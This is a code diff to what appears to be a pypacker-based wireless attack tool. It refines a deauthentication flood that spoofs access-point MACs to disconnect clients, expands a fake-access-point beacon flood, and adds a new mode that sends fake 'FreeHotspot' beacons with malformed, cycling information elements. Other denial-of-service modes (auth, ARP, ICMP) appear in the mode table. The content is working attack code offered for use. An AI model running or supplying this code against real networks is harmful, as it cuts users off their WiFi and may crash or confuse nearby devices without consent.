@@ -88,8 +88,14 @@ def wifi_deauth_cb(pargs):
 			except Exception as ex:
 				logger.warning(ex)
 			# TODO: use channel info from radiotap?
+
+
 			if pkt_ieee80211.is_beacon():
 				bssid = pkt_ieee80211.beacon.bssid
+
+				if bssid in pargs.macs_excluded:
+					#logger.debug("excluding AP: %r", bssid)
+					continue
 				# don't overwrite already stored client MACs
 				if bssid not in wdata[pargs.current_channel]:
 					# logger.debug("new AP: %r %s", bssid, utils.get_vendor_for_mac(bssid))
@@ -98,10 +104,16 @@ def wifi_deauth_cb(pargs):
 			for client in pkt_ieee80211.extract_client_macs():
 				bssid = pkt_ieee80211.upper_layer.bssid
 
-				if client not in pargs.macs_excluded and\
-						client not in wdata[pargs.current_channel][bssid]:
+				if bssid in pargs.macs_excluded:
+					#logger.debug("excluding AP: %r", bssid)
+					continue
+
+				if client in pargs.macs_excluded or\
+						client in wdata[pargs.current_channel][bssid]:
+					#logger.debug("excluding client: %r", bssid)
+					continue
 					# logger.debug("new client: %r %s", client, utils.get_vendor_for_mac(client))
-					wdata[pargs.current_channel][bssid].add(client)
+				wdata[pargs.current_channel][bssid].add(client)
 
 	pargs.is_running = True
 	pargs.current_channel = channels[0]
@@ -145,29 +157,27 @@ def wifi_deauth_cb(pargs):
 						sum(len(clients) for ap, clients in wdata[channel].items()),
 						cnt
 			)
+			# TODO: quite slow
+			aps = list(wdata[channel].keys())
 
-			ap_clients = copy.copy(wdata[channel])
-
-			for mac_ap, macs_clients in ap_clients.items():
+			for mac_ap, macs_clients in [[ap, wdata[channel][ap]] for ap in aps]:
 				layer_deauth.seq += 1
+				layer_deauth.src = mac_ap
 				layer_deauth.bssid = mac_ap
 
 				if not pargs.nobroadcast:
 					# reset src/dst for broadcast
-					layer_deauth.src = b"\xFF" * 6
 					layer_deauth.dst = b"\xFF" * 6
 
 					# TODO: increase?
-					# TODO: check sequence
 					# logger.debug("deauth AP: %r", mac_ap)
 					for _ in range(5):
 						layer_deauth.seq += 1
 						psock_send.send(pkt_deauth.bin())
 
-				for mac_client in macs_clients:
+				for mac_client in list(macs_clients):
 					# logger.debug("deauth client: %r", mac_client)
-					pkt_deauth.src = mac_client
-					pkt_deauth.dst = mac_client
+					layer_deauth.dst = mac_client
 
 					for _ in range(2):
 						layer_deauth.seq += 1
@@ -176,10 +186,18 @@ def wifi_deauth_cb(pargs):
 	psock_send.close()
 	psock_rcv.close()
 
+CHARS_ALNUM = string.ascii_uppercase + string.ascii_lowercase + string.digits
+
+def get_random_essid():
+	return bytes(
+		"".join(
+		random.choice(CHARS_ALNUM) for _ in range(32)),
+		"ascii"
+	)
 
 def wifi_ap_cb(pargs):
 	"""
-	Create fake APs
+	Create a massive amount of fake APs
 	"""
 	if pargs.channels is not None:
 		channels = [int(channel) for channel in pargs.channels.split(",")]
@@ -207,7 +225,7 @@ def wifi_ap_cb(pargs):
 	_beacon.params[2].body_bytes = pack_B(channels[0])
 	_beacon.seq = 0
 	# adaptive sleeptime due to full buffer on fast sending
-	sleeptime = 0.0000001
+	sleeptime = 0.000001
 	rand_mac = True
 	rand_essid = True
 	pargs.is_running = True
@@ -219,6 +237,9 @@ def wifi_ap_cb(pargs):
 	for cnt in range(pargs.count):
 		if not pargs.is_running:
 			break
+		if cnt & 0xFF == 0:
+			print("%d sent\r" % cnt, end="")
+			sys.stdout.flush()
 
 		for channel in channels:
 			_beacon.params[2].body_bytes = pack_B(channel)
@@ -230,10 +251,7 @@ def wifi_ap_cb(pargs):
 				_beacon.bssid = mac
 
 			if rand_essid:
-				_beacon.params[0].body_bytes = bytes("".join(
-					random.choice(string.ascii_uppercase + string.digits) for _ in range(10)),
-					"ascii"
-				)
+				_beacon.params[0].body_bytes = get_random_essid()
 				_beacon.params[0].len = len(_beacon.params[0].body_bytes)
 			#logger.info("AP on channel %d: %s", channel, _beacon.params[0].body_bytes)
 
@@ -250,11 +268,95 @@ def wifi_ap_cb(pargs):
 				# timeout on sending? that's ok
 				pass
 			except OSError:
-				sleeptime *= 2
-				logger.warning("buffer full, new sleeptime: %03.3f, waiting...", sleeptime)
+				sleeptime *= 10
+				print()
+				logger.warning("buffer full, new sleeptime: %03.6fs, waiting...", sleeptime)
 				time.sleep(1)
 	psock_send.close()
 
+
+
+def wifi_ap_ie(pargs):
+	"""
+	Create fake APs using various IEs
+	"""
+	if pargs.channels is not None:
+		channels = [int(channel) for channel in pargs.channels.split(",")]
+	else:
+		channels = utils.get_available_wlan_channels(pargs.iface_name)
+
+	beacon_orig = radiotap.Radiotap() + \
+					ieee80211.IEEE80211(type=ieee80211.MGMT_TYPE, subtype=ieee80211.M_BEACON, to_ds=0, from_ds=0) + \
+					ieee80211.IEEE80211.Beacon(
+					dst=b"\xFF\xFF\xFF\xFF\xFF\xFF",
+					src=b"\xFF\xFF\xFF\xFF\xFF\xFF",
+					params=[ieee80211.IEEE80211.IE(id=0, len=10, body_bytes=b"\x00" * 10),
+						ieee80211.IEEE80211.IE(id=1, len=8, body_bytes=b"\x82\x84\x8b\x96\x0c\x12\x18\x24"),
+						ieee80211.IEEE80211.IE(id=3, len=1, body_bytes=b"\x04"),
+						ieee80211.IEEE80211.IE(id=5, len=4, body_bytes=b"\x00\x01\x00\x00"),
+						ieee80211.IEEE80211.IE(id=0x2A, len=1, body_bytes=b"\x00"),
+						ieee80211.IEEE80211.IE(id=0x00, len=255, body_bytes=b"\x00"*16),
+					]
+					)
+	beacon = copy.deepcopy(beacon_orig)
+	_beacon = beacon[ieee80211.IEEE80211.Beacon]
+	mac = pypacker.get_rnd_mac()
+	essid = "FreeHotspot"
+	_beacon.src = mac
+	_beacon.bssid = mac
+	_beacon.params[0].body_bytes = bytes(essid, "ascii")
+	_beacon.params[0].len = len(essid)
+	_beacon.params[2].body_bytes = pack_B(channels[0])
+	_beacon.seq = 0
+	# adaptive sleeptime due to full buffer on fast sending
+	sleeptime = 0.000001
+	pargs.is_running = True
+
+	logger.info("faking APs on the following channels %r", channels)
+	psock_send = psocket.SocketHndl(iface_name=pargs.iface_name,
+									mode=psocket.SocketHndl.MODE_LAYER_2)
+	ie_cnt = 0
+
+	for cnt in range(pargs.count):
+		if not pargs.is_running:
+			break
+		if cnt & 0xFF == 0:
+			print("%d sent\r" % cnt, end="")
+			sys.stdout.flush()
+
+		for channel in channels:
+			_beacon.params[2].body_bytes = pack_B(channel)
+			_beacon.params[5].id = ie_cnt
+			utils.switch_wlan_channel(pargs.iface_name, channel)
+
+			mac = pypacker.get_rnd_mac()
+			_beacon.src = mac
+			_beacon.bssid = mac
+
+			_beacon.params[0].body_bytes = get_random_essid()
+			_beacon.params[0].len = len(_beacon.params[0].body_bytes)
+			#logger.info("AP on channel %d: %s", channel, _beacon.params[0].body_bytes)
+
+			try:
+				for cnt_ap in range(3):
+					# send multiple beacons for every ap
+					psock_send.send(beacon.bin())
+					time.sleep(sleeptime)
+					_beacon.seq = cnt_ap
+					# _beacon.ts = x << (8*7)
+					_beacon.ts = cnt_ap * 20
+				# time.sleep(0.01)
+			except socket.timeout:
+				# timeout on sending? that's ok
+				pass
+			except OSError:
+				sleeptime *= 10
+				print()
+				logger.warning("buffer full, new sleeptime: %03.6fs, waiting...", sleeptime)
+				time.sleep(1)
+
+			ie_cnt = (ie_cnt + 1) % 256
+	psock_send.close()
 
 def wifi_authdos_cb(pargs):
 	"""
@@ -529,6 +631,7 @@ if __name__ == "__main__":
 	mode_cb = {
 		"wifi_deauth": (["channels", "nobroadcast", "exclude"], wifi_deauth_cb),
 		"wifi_ap": (["channels"], wifi_ap_cb),
+		"wifi_ap_ie": (["channels"], wifi_ap_ie),
 		"wifi_auth": (["channel", "mac_dst", "channels"], wifi_authdos_cb),
 		"arp": (["mac_dst", "ip_dst"], arp_cb),
 		"icmp": (["mac_dst", "ip_dst"], icmp_cb),
